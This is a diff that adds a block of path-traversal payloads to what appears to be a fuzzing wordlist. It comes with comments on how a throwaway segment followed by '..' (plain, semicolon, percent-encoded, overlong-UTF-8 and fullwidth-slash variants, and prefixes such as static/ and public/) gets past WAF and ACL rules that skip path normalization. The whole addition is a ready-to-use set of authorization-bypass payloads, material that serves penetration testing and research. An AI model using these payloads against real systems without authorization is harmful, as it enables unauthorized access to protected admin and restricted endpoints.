@@ -572,3 +572,52 @@
 # ------------------------------------------------------------------------------
 [b].
 [b]%2e
+
+# ------------------------------------------------------------------------------
+# Sacrificial-prefix segment + traversal back ([h]) — classic AuthZ bypass:
+#   /x/../admin normalizes to /admin. A WAF that doesn't normalize before the
+#   ACL check sees the request match a different (non-ACLed) rule shape.
+# Double win: 'static', 'public', 'assets' etc. are often explicitly exempted
+# from AuthZ on many frameworks for asset serving — perfect sacrificial values.
+# ------------------------------------------------------------------------------
+# Anonymous placeholder (shortest possible)
+[h]x/..
+[h]x/../
+[h]x/..;
+[h]x/..;/
+[h]x;/..
+[h]x;/../
+[h]x;/..;
+[h]x//..
+[h]x//../
+[h]x/../x/..
+[h]x%2f..
+[h]x%2f..%2f
+[h]x%2f%2e%2e
+[h]x%2f%2e%2e%2f
+
+# Alternate placeholder names (some routers skip specific single-char segments)
+[h]a/..
+[h]foo/..
+[h]bar/..
+[h]1/..
+
+# WAF-whitelist prefixes (common AuthZ-exempt paths on many frameworks)
+[h]static/..
+[h]static/../
+[h]public/..
+[h]public/../
+[h]assets/..
+[h]assets/../
+[h]images/..
+[h]js/..
+[h]css/..
+[h]resources/..
+[h]files/..
+[h]uploads/..
+
+# Exotic encodings of sacrificial + traversal
+[h]%c0%af;x/..
+[h]%c0%afx%c0%af..
+[h]%ef%bc%8f;x/..
+[h]%ef%bc%8fx%ef%bc%8f..
